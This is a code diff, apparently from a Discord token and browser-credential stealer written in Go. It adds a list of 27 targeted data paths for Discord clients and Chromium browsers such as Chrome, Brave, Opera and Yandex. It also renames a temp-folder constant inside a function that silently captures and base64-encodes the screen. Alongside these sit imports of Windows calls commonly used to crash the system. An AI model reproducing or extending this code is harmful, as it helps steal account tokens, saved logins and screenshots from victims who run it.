@@ -27,6 +27,87 @@ var (
 
 	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
 	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
+
+	PLATFORMS = [27]PLATFORM{
+		{Chromium: false,
+			DataFiles: ROAMING + "\\discord"},
+		{Chromium: false,
+			DataFiles: ROAMING + "\\discordcanary"},
+		{Chromium: false,
+			DataFiles: ROAMING + "\\discordptb"},
+		{Chromium: true,
+			LocalState: ROAMING + "\\Opera Software\\Opera Stable\\Local State",
+			DataFiles:  ROAMING + "\\Opera Software\\Opera Stable"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: ROAMING + "\\Opera Software\\Opera GX Stable\\Local State",
+			DataFiles:  ROAMING + "\\Opera Software\\Opera GX Stable"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Google\\Chrome\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Google\\Chrome\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Yandex\\YandexBrowser\\User \\Local State",
+			DataFiles:  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Chromium\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Chromium\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Epic Privacy Browser\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Epic Privacy Browser\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Amigo\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Amigo\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Vivaldi\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Vivaldi\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Orbitum\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Orbitum\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Mail.Ru\\Atom\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Mail.Ru\\Atom\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Kometa\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Kometa\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Comodo\\Dragon\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Comodo\\Dragon\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Torch\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Torch\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Comodo\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Comodo\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Slimjet\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Slimjet\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\360Browser\\Browser\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\360Browser\\Browser\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Maxthon3\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Maxthon3\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\K-Meleon\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\K-Meleon\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Sputnik\\Sputnik\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Sputnik\\Sputnik\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Nichrome\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Nichrome\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\CocCoc\\Browser\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\CocCoc\\Browser\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\uCozMedia\\Uran\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\uCozMedia\\Uran\\User Data\\Default"},
+		{Chromium: true,
+			LocalState: LOCAL + "\\Chromodo\\User Data\\Local State",
+			DataFiles:  LOCAL + "\\Chromodo\\User Data\\Default"},
+	}
 )
 
 func GetTokens() []string {
@@ -72,15 +153,15 @@ func GetTokens() []string {
 }
 
 func GetScreenShot() string {
-	if _, err := os.Stat(TempFileDir); os.IsNotExist(err) {
-		os.MkdirAll(TempFileDir, 0700)
+	if _, err := os.Stat(TEMPFILEDIR); os.IsNotExist(err) {
+		os.MkdirAll(TEMPFILEDIR, 0700)
 	}
 
 	img, err := screenshot.CaptureScreen()
 	if err != nil {
 		panic(err)
 	}
-	f, err := os.Create(TempFileDir + "\\CAPTURE.png")
+	f, err := os.Create(TEMPFILEDIR + "\\CAPTURE.png")
 	if err != nil {
 		panic(err)
 	}
@@ -90,7 +171,7 @@ func GetScreenShot() string {
 	}
 	var _ = f.Close()
 
-	data, _ := os.ReadFile(TempFileDir + "\\CAPTURE.png")
+	data, _ := os.ReadFile(TEMPFILEDIR + "\\CAPTURE.png")
 
 	return strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(data)), "=", "")
 }
